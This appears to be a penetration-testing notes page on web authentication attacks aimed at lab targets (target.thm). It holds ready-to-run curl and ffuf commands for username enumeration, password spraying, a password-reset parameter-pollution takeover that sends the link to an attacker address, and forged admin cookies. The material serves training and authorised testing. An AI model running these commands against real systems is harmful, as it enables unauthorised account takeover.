# Authentication Attacks

Everything here exploits the same underlying flaw: the application **behaves differently** for valid and invalid input, and it does so before it has authenticated you. A signup form that says "already taken", a login that redirects instead of re-rendering, a reset flow that trusts the wrong copy of a parameter, a cookie that carries a decision instead of a reference to one. Find the difference and the rest is mechanical.

The order below is the order to work in: confirm usernames, then spend them on passwords, then — if both are slow — look for the logic flaw that skips the guessing entirely. Session handling for forms that carry a fresh [[Security-Terms#^csrf|CSRF]] token per request is in [[Burp-Suite]].

## Establish the difference by hand

```bash
curl -s -o /dev/null -w 'BAD  %{http_code} %{size_download} %{redirect_url}\n' \
  -d 'username=zznosuchuser7f31&password=zzwrong' http://target.thm/login
```

```bash
curl -s -o /dev/null -w 'GOOD %{http_code} %{size_download} %{redirect_url}\n' \
  -d 'username=admin&password=zzwrong' http://target.thm/login
```

- two requests, one variable changed → the first uses a username that certainly does not exist, the second a name that probably does. Any difference between the two responses **is** username enumeration, already found, before you have run a single tool
- `%{size_download}` and `%{redirect_url}` → the two signals that most often carry the difference when the status code does not. A login that answers 200 for both but redirects only on success is extremely common
- `-d` without `-H 'Content-Type: ...'` → curl sets `application/x-www-form-urlencoded` itself for `-d`, so it is safe here. The moment you switch to a JSON API you must set it explicitly, and forgetting produces a 400 that looks like a broken payload
- capture the exact failure string from the body too (`curl -s ... | grep -i 'invalid\|incorrect'`) — that string is what `-mr` and hydra's `F=` will take

## Enumerate valid usernames

Signup forms are the usual leak, because uniqueness has to be checked before the account is created:

```bash
ffuf -w /usr/share/seclists/Usernames/Names/names.txt:USER \
  -X POST -d 'username=USER&email=x@x.thm&password=Zz1!zzzz&cpassword=Zz1!zzzz' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -u http://target.thm/customers/signup -mr 'username already exists' -o users-found.json
```

- `-mr 'username already exists'` → match on a string in the **body**. Copy it verbatim from the manual request; a paraphrase matches nothing and produces a clean empty run
- `-H 'Content-Type: application/x-www-form-urlencoded'` → **the header ffuf does not set for you.** Without it the server does not parse the body, every request fails identically, and the result is indistinguishable from no usernames existing
- the dummy fields → `email`, `password`, `cpassword` must be present and must pass the form's own validation, or you get a validation error rather than the uniqueness check. A password failing a complexity rule silently breaks the whole run
- `USER` as the keyword instead of `FUZZ` → clearer once you have two wordlists, and it must appear in the body exactly as declared after the colon
- `-o users-found.json` → save it. This list is the input to the next section and you do not want to run this twice

## Spray passwords against confirmed usernames

```bash
ffuf -w users-found.txt:U -w /usr/share/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:P \
  -X POST -d 'username=U&password=P' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -u http://target.thm/customers/login -mode clusterbomb -fs 4242
```

- two wordlists with `:U` and `:P` → named inputs, referenced by name in the body
- `-mode clusterbomb` → every username against every password. `-mode pitchfork` (positional pairs) is what you want when you have matched user:pass pairs from a breach dump instead
- `-fs 4242` → **the number from the manual baseline, not a guess.** Filtering is the whole game here: pick the wrong dimension and you either see everything or nothing. Use `-fc` when the status differs, `-fs`/`-fw` when only the body does, and `-fr` for a failure string
- filter on **failure**, not success → you know exactly what a failed login looks like because you produced one by hand; you do not yet know what success looks like. Hiding the known failure and looking at what remains is more reliable than predicting the hit
- `-p 0.2` → a delay between requests. Slower, and often the difference between a full run and a lockout that ends the engagement
- `-t 10` → lower the thread count for the same reason

## Logic flaws — when the flow trusts the wrong copy of a value

```bash
curl -i 'http://target.thm/customers/reset?email=robert%40target.thm' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -d 'username=robert&email=attacker@collector.thm'
```

- the same parameter twice, once in the query and once in the body → this is the entire attack. PHP's `$_REQUEST` merges GET and POST in the order `request_order` sets. The `php.ini` files PHP ships set it to `GP`, so cookies stay out. If `request_order` is left unset (PHP's built-in default is an empty string), PHP falls back to `variables_order`, default `EGPCS`, and cookies get merged in too. Last wins, so **POST overwrites GET**
- so the application identifies the account from the value it reads one way, and sends the reset link to the value it reads the other way. Both are "the email parameter" and they are not the same string
- `-i` → show the response headers. The tell is often a redirect or a `Set-Cookie`, not the body
- the generalisation is worth more than the example: wherever a value appears in two places, test which one wins. Query versus body, body versus cookie, a header versus a JSON field, the same key twice in one body (`email=a&email=b`), and the same key in a JSON object

## Cookies that carry the decision

```bash
curl -s -b 'logged_in=true; admin=true; role=administrator' http://target.thm/account
```

- `-b` → send cookies. `-H 'Cookie: ...'` does the same; `-b` is less to type and does not conflict with other headers you may add
- read the real cookies first (`curl -i` on the login page, or the browser's storage panel) and set **the names the application actually uses**. Inventing names sets cookies nothing reads and produces a confident-looking negative
- decode before deciding it is opaque: a `.`-separated triple is a [[Security-Terms#^jwt|JWT]] (`base64 -d` the middle part and read the claims); a long hex string may be an [[Security-Terms#^md5|MD5]] of something guessable; base64 is base64 and often decodes to plain text
- a JWT with `"alg": "none"`, or one signed with a weak secret, is the modern version of this bug and is far more common than a literal `admin=true`
